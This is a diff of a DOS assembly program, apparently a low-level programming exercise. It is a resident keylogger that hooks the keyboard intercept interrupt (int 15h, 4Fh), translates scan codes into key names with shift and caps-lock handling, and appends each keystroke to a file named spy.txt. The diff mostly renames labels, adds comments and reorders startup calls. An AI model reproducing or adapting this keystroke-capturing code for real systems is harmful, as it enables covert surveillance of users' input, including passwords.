@@ -9,7 +9,7 @@ file_descriptor dw 0
 number dw 0
 
 temp_buffer db 14 dup ('$')
-endl db  10, 13, '$'
+endl db  10, 13, 0, '$'
 space db " ", '$'
 error_parsing db "Failed to parse command line args", '$'
 create_file_error_message db "Creating file failed", '$'
@@ -18,7 +18,7 @@ write_file_error_message db "Writing into file failed", '$'
 close_file_error_message db "Closing file failed", '$'
 error_status_code_message db "Error status code ->", '$'
 file_open_success_message db "File was successfully opened", '$'
-path db "./spy.txt", 11 dup (0)
+path db "./spy.txt", 11 dup (0), '$'
 temp_string db "temp string", '$'
 symbol db "C", 0
 
@@ -27,11 +27,12 @@ error_message db "Something went wrong ...", '$'
 old_handler dd 0  ; 4 bytes
 int_21h dd 0      ; 4 bytes
 
+file_end_line db 13, 10
 len equ 10
-strings         db "Esc"
+keys            db "Esc"
 nums            db "1!"
                 db "2@"
-                db "3", 23h; # char
+                db "3#" ;# char
                 db "4$"
                 db "5%"
                 db "6^"
@@ -82,7 +83,7 @@ nums5           db ",<"
                 db ".>"
                 db "/?"
 the_rest        db "RShift    "
-                db "Grey*     "
+                db "Numpad *  "
                 db "Alt       "
                 db "SpaceBar  "
                 db "CapsLock  "
@@ -101,11 +102,11 @@ the_rest        db "RShift    "
                 db "Home      "
                 db "UpArrow   "
                 db "PgUp      "
-                db "Grey-     "
+                db "Numpad -  "
                 db "LeftArrow "
                 db "KeyPad 5  "
                 db "RightArrow"
-                db "Grey+     "
+                db "Numpad +  "
                 db "End       "
                 db "DownArrow "
                 db "PgDn      "
@@ -120,88 +121,107 @@ the_rest        db "RShift    "
                 db "PA1       "
                 db "F13       "
                 db "F14       "
-                db "F15       "
-new_line        db 10, 13, '$'
-
+                db "F15       "  
+;
+; new handler for int 15h
 new_handler proc
-    pushf
-    cmp ah, 4Fh
-    jne not_interested
-    call dword ptr cs:old_handler
-    cli
-    push ds
-    push cs
-    pop ds
-    jc continue ;if scan code
-    jmp int_end ; if not a scan code
-continue:
-    push ax
-    push bx
-    push es
-    cmp al, 0
-    je skip_out
-    cmp al, 5Dh
-    ja skip_out
-    cmp al, 3Ah
-    jne fine
-    mov cx, 0
-    mov es, cx
-    mov bx, 417h  ; adress 0000:417h - shift status
-    mov cl, es:[bx]
-    and cl, 01000000b ;6 bit - capslock on
-    cmp cl, 0
-    je fine
-    jmp skip_out
-fine:
+  pushf
+  cmp ah, 4Fh ; compare sub-function code (OS HOOK - KEYBOARD INTERCEPT)
+  jne end_handler
+  call dword ptr cs:old_handler
+    
+  cli ;disable interuptions
+  push ds
+  push cs
+  pop ds
+  jnc int_end ; if not a scan code
+
+  push ax
+  push bx
+  push es
+
+  cmp al, 0
+  je skip_out         ;  0 == 'not-a-key' scancode
+
+  cmp al, 5Dh 
+  ja skip_out         ;higher then F10
+
+  cmp al, 3Ah         ;caps_lock key
+  jne non_caplock
+
+  mov cx, 0
+  mov es, cx
+  mov bx, 417h        ; adress 0000:417h - shift status
+  mov cl, es:[bx]     ; byte respresents `shift` status
+  and cl, 01000000b   ;6 bit - capslock on
+  cmp cl, 0
+  jne skip_out
+    
+  non_caplock:
     push ax
     ; open file
     mov ah, 3Dh
-    mov al, 0100010b
-    mov dx, offset path
+    ; mov al, 0100010b
+    mov al, 1h
+    mov dx, offset path   
     pushf
     call dword ptr cs:int_21h
     jc error_log
-    ; move file pointer
-    mov bx, ax
+
+    mov bx, ax        ; move file pointer
     mov ah, 42h
-    mov cx, 0
-    mov dx, 0
-    mov al, 2
+    mov cx, 0         ; offset 0
+    mov dx, 0         ; offset 0
+    mov al, 2         ; take offset from end of file
     pushf
-    call dword ptr cs:int_21h
+    call dword ptr cs:int_21h  
     jc error_log
+    
     pop ax
     push bx
     xor ah, ah
     cmp ax, 1; esc
-    je batch1
-    cmp ax, 0Eh; nums
+    je esc_key
+
+    cmp ax, 0Eh; 0E == backspace (below is NUMBERS row)
     jb batch2
+
     cmp ax, 10h; special1
     jb batch3
+ 
     cmp ax, 1Ah; line1
     jb batch4
+    
     cmp ax, 1Ch; nums2
     jb batch5
+    
     cmp ax, 1Eh; special2
     jb batch6
+    
     cmp ax, 27h; line2
     jb batch7
+    
     cmp ax, 2Ah; nums3
     jb batch8
+    
     cmp ax, 2Bh; special3
     jb batch9
+    
     cmp ax, 2Ch; nums4
     jb batch10
+    
     cmp ax, 33h; line3
     jb batch11
+    
     cmp ax, 36h; nums5
     jb batch12
+
     jmp other
-    batch1:; esc
-    mov dx, offset strings
+    esc_key:; esc
+    mov dx, offset keys
     mov cx, 3
     jmp write
+
     batch2:; nums
     sub ax, 2
     mov bx, 2
@@ -210,6 +230,8 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_special
+    
+  
     batch3:; special1
     sub ax, 0Eh
     mov bx, 9
@@ -218,6 +240,7 @@ fine:
     add dx, ax
     mov cx, 9
     jmp write
+    
     batch4:; line1
     sub ax, 10h
     mov bx, 2
@@ -226,6 +249,7 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_capital
+    
     batch5:;nums2
     sub ax, 1Ah
     mov bx, 2
@@ -234,6 +258,7 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_special
+    
     batch6:; special2    
     sub ax, 1Ch
     mov bx, 5
@@ -242,6 +267,7 @@ fine:
     add dx, ax
     mov cx, 5
     jmp write
+    
     batch7:; line2
     sub ax, 1Eh
     mov bx, 2
@@ -250,6 +276,7 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_capital
+    
     batch8:; nums3
     sub ax, 27h
     mov bx, 2
@@ -258,14 +285,17 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_special
+    
     batch9:; special3
     mov dx, offset special_3
     mov cx, 6
     jmp write
+    
     batch10:; nums4
     mov dx, offset nums4
     mov cx, 1
     jmp check_if_special
+    
     batch11:; line3
     sub ax, 2Ch
     mov bx, 2
@@ -274,6 +304,7 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_capital
+    
     batch12:; nums5
     sub ax, 33h
     mov bx, 2
@@ -282,6 +313,7 @@ fine:
     add dx, ax
     mov cx, 1
     jmp check_if_special
+    
     other:; other
     sub ax, 36h
     mov bx, len
@@ -290,6 +322,17 @@ fine:
     add dx, ax
     mov cx, len
     jmp write
+                      ;                          Shift Status
+
+                      ; 7 6 5 4 3 2 1 0
+                      ; x . . . . . . .      Insert locked
+                      ; . x . . . . . .      Caps Lock locked
+                      ; . . x . . . . .      Num Lock locked
+                      ; . . . x . . . .      Scroll Lock locked
+                      ; . . . . x . . .      Alt key is pressed
+                      ; . . . . . x . .      Ctrl key is pressed
+                      ; . . . . . . x .      Left Shift key is pressed
+                      ; . . . . . . . x      Right Shift key is pressed
 check_if_capital:
     mov ax, 0
     mov es, ax
@@ -298,15 +341,20 @@ check_if_capital:
     and al, 01000011b
     cmp al, 0
     je write
+
     cmp al, 01000001b
     je write
+
     cmp al, 01000010b
     je write
+
     cmp al, 01000011b
     je write
+
     inc dx
     jmp write
-check_if_special:
+
+  check_if_special:
     mov ax, 0
     mov es, ax
     mov bx, 417h
@@ -314,20 +362,24 @@ check_if_special:
     and al, 11b
     cmp al, 0
     je write
+
     inc dx
     jmp write
-write:
+
+  write:
     pop bx
     mov ah, 40h
     pushf
     call dword ptr cs:int_21h
     jc skip_out
+
     mov ah, 40h
-    mov dx, offset new_line
+    mov dx, offset file_end_line
     mov cx, 2
     pushf
     call dword ptr cs:int_21h
     jc skip_out
+
     ; close file
     mov ah, 3Eh
     pushf
@@ -339,22 +391,28 @@ error_log:
     mov dx, offset error_message
     pushf
     call dword ptr cs:int_21h
-skip_out:
+
+  skip_out:
     pop es
     pop bx
     pop ax
     jmp int_end
-not_interested:
+  
+  end_handler:
     pushf
     call dword ptr cs:old_handler
     jmp int_ret
-int_end:
+  
+  int_end:
     pop ds
     sti
-int_ret:
+
+  int_ret:
     iret
 endp
 
+; for calculating size when keeping resident 
+end_resident:
 
 init macro
   mov ax, cs
@@ -506,7 +564,8 @@ log proc
   push ax
   mov ax, 0900h
   mov dx, ss:[bp+4]
-  call dword ptr cs:int_21h
+  ; call dword ptr cs:int_21h
+  int 21h
   pop ax
   pop bp
   ret
@@ -517,65 +576,6 @@ call_log macro value
   call log
   pop dx
 endm
-
-; new_handler proc far
-;   pushf
-;   cmp ah, 4fh
-;   jne skip_int
-;   call dword ptr cs:old_handler
-;   cli ;disable interuptions
-;   push ds
-;   push cs
-;   pop ds
-;   ; jc continue ;if scan code
-;   jnc skip_int ; if not a scan code
-
-;   call open_file_from_end
-;   call write_into_file
-;   call close_file
-
-;   ; continue:
-;   ;   push ax
-;   ;   push bx
-;   ;   push es
-
-;   ;   cmp al, 0
-;   ;   je skip_out
-;   ;   cmp al, 5Dh
-;   ;   ja skip_out
-;   ;   cmp al, 3Ah
-;   ;   jne fine
-;   ;   mov cx, 0
-;   ;   mov es, cx
-;   ;   mov bx, 417h  ; adress 0000:417h - shift status
-;   ;   mov cl, es:[bx]
-;   ;   and cl, 01000000b ;6 bit - capslock on
-;   ;   cmp cl, 0
-;   ;   je fine
-;   ;   jmp skip_out
-  
-;   ; fine:
-;   ;   push ax
-;   ;   ; open file
-;   ;   call cs:open_file_from_end
-
-;   ;   pop ax
-
-;   ; push ds
-;   ; push cs
-;   ; pop ds
-  
-;   ; pushf
-
-  
-;   pop ds
-;   skip_int:
-;   iret
-; endp
-
-
-; for calculating size when keeping resident 
-end_resident:
 
 parse_command_line proc
   push di
@@ -598,7 +598,6 @@ parse_command_line proc
   mov di, 81h
   mov al, ' '
   rep scasb ; skip all spaces
-  ; dec di
   dec di
 
   xor cx, cx
@@ -762,10 +761,10 @@ endp
 
 start:
   init
+  call parse_command_line
+
   ; override `int 15h` & `int 21h` (store old & set new)
   call override
-
-  call parse_command_line
 
   ; open file & close (result -> stored file_descriptor)
   call create_file
